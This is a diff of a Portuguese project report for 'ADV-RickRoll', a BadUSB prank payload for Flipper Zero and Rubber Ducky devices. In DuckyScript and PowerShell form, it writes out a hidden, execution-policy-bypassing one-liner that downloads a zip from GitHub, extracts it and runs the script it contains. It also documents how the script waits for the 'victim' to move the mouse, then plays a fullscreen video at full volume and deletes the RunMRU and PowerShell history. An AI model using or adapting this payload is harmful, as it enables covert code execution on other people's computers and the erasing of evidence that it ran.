@@ -56,9 +56,9 @@ Abaixo estão detalhadas todas as alterações efetuadas em cada arquivo do proj
   - A nova versão corrigida e aprimorada do `rr.ps1`.
 
 ### 3.3. [ADV-RickRoll.txt](file:///home/juca/Documentos/ADV-RickRoll/ADV-RickRoll.txt)
-* O payload DuckyScript foi unificado e enriquecido: incorpora agora a chamada Win32 `ShowWindow` para ocultação imediata e as rotinas diretas de download e extração em linha única:
+* O payload DuckyScript foi unificado em comando autônomo (*standalone*), seguro e à prova de falhas:
   ```duckyscript
-  STRING powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
+  STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des "$D\rr" -Force;. "$D\rr\rr.ps1"
   ```
 * Mantida a compatibilidade total com dispositivos BadUSB (Flipper Zero, Rubber Ducky, etc.) e incluído comentário de instrução para execução direta no Windows (`Win + R`).
 
@@ -66,7 +66,7 @@ Abaixo estão detalhadas todas as alterações efetuadas em cada arquivo do proj
 * O arquivo `StageOne.txt` foi absorvido e unificado diretamente dentro do `ADV-RickRoll.txt`, deixando de existir como arquivo avulso no repositório.
 
 ### 3.5. [ReadMe.md](file:///home/juca/Documentos/ADV-RickRoll/ReadMe.md)
-* Atualizado o `README` com a nova URL pública do GitHub e com o comando unificado.
+* Atualizado o `README` com a nova URL pública do GitHub e com o comando unificado estável.
 * Adicionada a seção **Modifications & Improvements** documentando as melhorias técnicas e a unificação do `StageOne.txt`.
 * Atualizados os créditos e autoria da recriação.
 
@@ -91,14 +91,14 @@ Abaixo estão detalhadas todas as alterações efetuadas em cada arquivo do proj
 ### Execução Direta no Windows (via Caixa Executar `Win + R`)
 Copie e cole o comando unificado a seguir na janela Executar do Windows:
 ```powershell
-powershell -w h -NoP -NonI -Ep Bypass "$i='[DllImport(\"user32.dll\")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Set-Location $env:tmp;irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O rr.zip;Expand-Archive rr.zip -Des rr -Force;. .\rr\rr.ps1"
+powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://raw.githubusercontent.com/xJCPMSx/ADV-RickRoll/main/rr.zip' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des "$D\rr" -Force;. "$D\rr\rr.ps1"
 ```
 
 ### O que acontece durante a execução:
-1. O PowerShell abre e, antes mesmo de iniciar qualquer download ou processamento pesado, invoca nativamente a API Win32 `ShowWindow` para ocultar o console (evitando qualquer flash visual).
-2. O diretório de trabalho é alterado para a pasta temporária (`$env:tmp`).
-3. O pacote `rr.zip` é baixado diretamente do GitHub Raw e descompactado na pasta temporária `rr\`.
-4. O script ativa a função `Target-Comes`, alternando o CapsLock a cada 3 segundos e aguardando a movimentação do mouse pela vítima.
+1. O processo PowerShell é inicializado com a flag nativa `-WindowStyle Hidden` (`-w h`), garantindo execução oculta sem janelas de terminal abertas.
+2. O caminho temporário é isolado na variável `$D`, blindando o comando contra diretórios de usuários contendo espaços.
+3. O pacote `rr.zip` é baixado diretamente do GitHub Raw e descompactado na pasta dedicada `$D\rr\`.
+4. O script [rr.ps1](file:///home/juca/Documentos/ADV-RickRoll/rr.ps1) é invocado e ativa a função `Target-Comes`, alternando o CapsLock a cada 3 segundos e aguardando a movimentação do mouse pela vítima.
 5. Assim que o mouse se mexe, a janela em tela cheia do WPF carrega o vídeo com volume em 100%.
 6. Ao término ou fechamento, todos os rastros temporários, histórico do RunMRU e do PowerShell são apagados.
 
@@ -144,3 +144,22 @@ Manter `StageOne.txt` como um arquivo separado no repositório era desnecessári
 
 6. **Publicação da Release v1.1.0 no GitHub:**
    - Publicada a nova versão [v1.1.0](https://github.com/xJCPMSx/ADV-RickRoll/releases/tag/v1.1.0) com notas detalhadas e o asset binário oficial `rr.zip` atualizado.
+
+---
+
+## 7. Diagnóstico e Resolução do Erro "Linha 1 Caractere 219"
+
+### 7.1. Causa Raiz do Erro
+Ao testar a execução da versão que tentava injetar `Add-Type` e `[DllImport]` diretamente na linha de comando inline do PowerShell, ocorria o seguinte erro no terminal:
+`No caractere Linha:1 Caractere:219 ... Unable to find type [native.win]`
+
+* O caractere 219 apontava precisamente para o início da chamada `[native.win]::ShowWindow`.
+* O comando anterior (`add-type -name win -member $i -namespace native -ErrorAction SilentlyContinue`) continha caracteres de escape de barra invertida (`\"user32.dll\"`) dentro de aspas simples `$i='...'`. No PowerShell, aspas simples tratam a barra invertida literalmente, passando `\"user32.dll\"` ao compilador C#, o que gerava um erro de sintaxe de compilação.
+* Devido à flag `-ErrorAction SilentlyContinue`, o `Add-Type` falhava silenciosamente e **não registrava** o tipo `native.win` na memória.
+* Imediatamente na instrução seguinte, o PowerShell tentava chamar `[native.win]::ShowWindow` e disparava a exceção no caractere 219 informando que o tipo não existia.
+
+### 7.2. Solução Implementada
+* A compilação inline de C# em linha de comando foi descartada por ser desnecessária e frágil entre diferentes ambientes (interpretação de aspas e variáveis entre CMD, Executar e PowerShell).
+* O PowerShell já possui a flag nativa `-WindowStyle Hidden` (`-w h`), que inicializa o processo de forma 100% invisível diretamente pelo Windows.
+* A chamada ao Win32 `ShowWindow` já é executada de forma nativa e segura dentro do próprio [rr.ps1](file:///home/juca/Documentos/ADV-RickRoll/rr.ps1) (como script PowerShell real e isolado), sem risco de conflito de escape de aspas ou variáveis.
+* O comando de linha única unificado foi padronizado com caminhos delimitados por variáveis entre aspas (`$D="$env:tmp"; ... "$D\rr.zip" ... "$D\rr"`), garantindo execução perfeita mesmo em computadores cujo nome de usuário contenha espaços.
